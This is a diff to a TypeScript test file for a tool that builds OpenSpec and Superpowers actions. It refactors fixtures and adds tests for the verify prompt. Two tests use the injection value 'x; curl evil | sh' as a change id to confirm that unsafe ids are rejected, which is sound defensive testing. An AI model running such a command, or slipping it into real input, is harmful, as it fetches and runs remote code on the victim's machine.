@@ -48,6 +48,12 @@ const promptOf = (action: Action): string => {
   return action.run.prompt
 }
 
+/** The fixture's item, carrying the change id it is given. */
+const itemWithChangeId = (changeId: string): typeof item => ({
+  ...item,
+  openspec: { ...item.openspec, changeId }
+})
+
 test('runs OpenSpec commands in a terminal when the CLI is there', () => {
   const actions = actionsForItem(item, true)
   const validate = findAction(actions, 'openspec.validate')!
@@ -389,14 +395,7 @@ test('the Superpowers prompt names the topic of the work, not the change id', ()
 })
 
 test('an unsafe change id leaves the item with no OpenSpec action', () => {
-  const actions = actionsForItem(
-    {
-      topic: 'add-x',
-      openspec: { ...item.openspec, changeId: 'x; curl evil | sh' },
-      superpowers: item.superpowers
-    },
-    true
-  )
+  const actions = actionsForItem(itemWithChangeId('x; curl evil | sh'), true)
   assert.deepEqual(
     actions.filter((action) => action.framework === 'openspec').map((action) => action.id),
     []
@@ -405,14 +404,7 @@ test('an unsafe change id leaves the item with no OpenSpec action', () => {
 })
 
 test('an unsafe change id leaves the item with no OpenSpec action in the agent form either', () => {
-  const actions = actionsForItem(
-    {
-      topic: 'add-x',
-      openspec: { ...item.openspec, changeId: 'x; curl evil | sh' },
-      superpowers: item.superpowers
-    },
-    false
-  )
+  const actions = actionsForItem(itemWithChangeId('x; curl evil | sh'), false)
   assert.deepEqual(
     actions.filter((action) => action.framework === 'openspec').map((action) => action.id),
     []
@@ -519,14 +511,7 @@ test("the palette's agent prompt still carries the placeholder", () => {
 
 test('a change id that is the placeholder itself gets no OpenSpec action', () => {
   // A throw here would fail the test: one bad directory must not blank the whole board.
-  const actions = actionsForItem(
-    {
-      topic: 'add-x',
-      openspec: { ...item.openspec, changeId: '<change-id>' },
-      superpowers: item.superpowers
-    },
-    true
-  )
+  const actions = actionsForItem(itemWithChangeId('<change-id>'), true)
   assert.deepEqual(
     actions.filter((action) => action.framework === 'openspec').map((action) => action.id),
     []
@@ -535,14 +520,7 @@ test('a change id that is the placeholder itself gets no OpenSpec action', () =>
 })
 
 test('a change id that is the placeholder itself gets no OpenSpec action in the agent form', () => {
-  const actions = actionsForItem(
-    {
-      topic: 'add-x',
-      openspec: { ...item.openspec, changeId: '<change-id>' },
-      superpowers: item.superpowers
-    },
-    false
-  )
+  const actions = actionsForItem(itemWithChangeId('<change-id>'), false)
   assert.deepEqual(
     actions.filter((action) => action.framework === 'openspec').map((action) => action.id),
     []
@@ -880,4 +858,30 @@ test('the palette of a remote project is the agent form too', () => {
   for (const action of palette.openspec) {
     assert.equal(action.run.kind, 'agent', action.id)
   }
+})
+
+test('验证这一按钮要求 agent 写下这一轮，并点名计划文件', () => {
+  const prompt = promptOf(findAction(actionsForItem(item, true), 'superpowers.verify')!)
+  assert.match(prompt, /## 验证记录/)
+  assert.match(prompt, /docs\/superpowers\/plans\/x\.md/)
+  // 复选框那一句是必需的：agent 写复选框是很自然的事，不说它就会那么写。
+  assert.match(prompt, /不要写复选框/)
+})
+
+test('没有计划的工作项不要求写记录', () => {
+  // 没有地方放记录，要求它写只会让 agent 去找一份不存在的计划。
+  const prompt = promptOf(
+    findAction(
+      actionsForItem({ ...item, superpowers: { ...item.superpowers, plan: null } }, true),
+      'superpowers.verify'
+    )!
+  )
+  assert.equal(prompt.includes('## 验证记录'), false)
+})
+
+test('调色板里的验证动作不要求写记录', () => {
+  // 调色板不知道具体是哪份计划。
+  const palette = frameworkActions(false)
+  const verify = palette.superpowers.find((action) => action.id === 'superpowers.verify')!
+  assert.equal(promptOf(verify).includes('## 验证记录'), false)
 })
